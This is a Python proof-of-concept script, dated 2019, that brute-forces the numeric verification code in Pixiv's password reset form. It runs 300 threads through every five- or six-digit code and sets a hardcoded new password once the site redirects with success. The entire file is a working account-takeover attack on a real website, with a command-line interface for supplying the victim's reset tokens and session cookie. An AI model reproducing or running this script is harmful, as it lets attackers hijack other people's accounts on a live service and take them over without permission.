#!/usr/bin/python3.7
# encoding: utf-8
'''
@file: poc
@time: 2019-09-30 02:28
@desc:
'''
import itertools
import threading
from optparse import OptionParser
import requests
try:
    from itertools import imap
except ImportError:
    imap=map
try:
   import queue
except ImportError:
   import Queue as queue


threads = []

class pixiv(object):
    def __init__(self, tt, code_id, code,session,mode="single",prefix = ""):
        self.tt = tt
        self.code_id = code_id
        self.code = code
        self.quest_queue = queue.Queue()
        self.password = '668220668220a'
        self.prefix = prefix
        self.mode = mode
        self.threadLock = threading.Lock()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': 'PHPSESSID='+session}
        self.success = False

    def run(self):
        while True:
            self.threadLock.acquire()
            if not self.quest_queue.empty() or self.success == False:
                code = self.quest_queue.get()
                self.threadLock.release()
                self.reset(code)
            else:
                self.threadLock.release()
                break

    def generate(self):
        if 'single' in self.mode:
            repeat = 5
        else:
            repeat = 6

        for s in imap(''.join, itertools.product('0123456789', repeat=repeat)):
            self.quest_queue.put(self.prefix + s)

    def reset(self,authentication_code):
        url = "https://www.pixiv.net/reset_pass.php?code_id=%s&code=%s" % (self.code_id,self.code)
        end = '&mode=reset&&new_password_1='+self.password+'&new_password_2='+self.password+'&submit=1'
        data = 'tt='+self.tt+'&authentication_code=' +authentication_code + end
        try:
            if self.success==False:
                res = requests.post(url, data, headers=self.headers, allow_redirects=False)
                if (res.status_code == 302 ):
                    if 'reset_pass.php?success=1' in res.headers['Location']:
                        print('\n\n[*]code:' + authentication_code)
                        print('[*]pass:' + self.password)
                        self.threadLock.acquire()
                        self.success = True
                        self.threadLock.release()
                    else:
                        print('[*]code:' + authentication_code )
                else:
                    print("[*]error")
                    self.threadLock.acquire()
                    self.success = True
                    self.threadLock.release()

        except Exception as e:
            print(e)


def start(tt,prefix,session,code_id,code):
    try:
        p = pixiv(prefix=prefix, session=session, tt=tt,
                  code_id=code_id, code=code)
        p.generate()

        for x in range(300):
            t = threading.Thread(target=p.run)
            threads.append(t)
            t.setDaemon(True)
            t.start()

        while True:
            alive = False
            for td in threads:
                alive = td.isAlive()
            if not alive:
                break

    except Exception as e:
        print(e)
        quit()

if __name__ == '__main__':
    try:
        optParser = OptionParser()
        optParser.add_option('-t', '--tt', dest='tt', type=str, default=None, help='tt token')
        optParser.add_option('-i', '--id', dest='code_id', type=str, default=None, help='code_id')
        optParser.add_option('-c', '--code', dest='code', type=str, default=None, help='code')
        optParser.add_option('-s', '--session', dest='session', type=str, default=None, help='phpsession')
        optParser.add_option('-p', '--prefix', dest='prefix', type=str, default=None, help='prefix')

        options, args = optParser.parse_args()
        if options.tt is not None:
            start(tt=options.tt, code_id=options.code_id, code=options.code,
                  session=options.session, prefix=options.prefix)
        else:
            optParser.print_help()
    except Exception as e:
        print(e)